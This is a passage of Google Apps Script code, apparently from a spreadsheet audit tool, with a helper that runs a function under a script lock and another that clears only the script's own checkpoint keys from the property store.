 * interference between operators is handled separately, by giving each run its
 * own pair of tabs.
 */
function withLock_(fn) {
  const lock = LockService.getScriptLock();
  if (!lock.tryLock(5000)) {
    throw new Error('Another audit is already running against this ' +
      'spreadsheet. Wait for it to pause, then retry.');
  }
  try {
    fn();
  } finally {
    lock.releaseLock();
  }
}


/** Remove only this script's own keys, never the whole property store. */
function clearCheckpoint_(props) {
  CHECKPOINT_KEYS.forEach(function (k) { props.deleteProperty(k); });
}
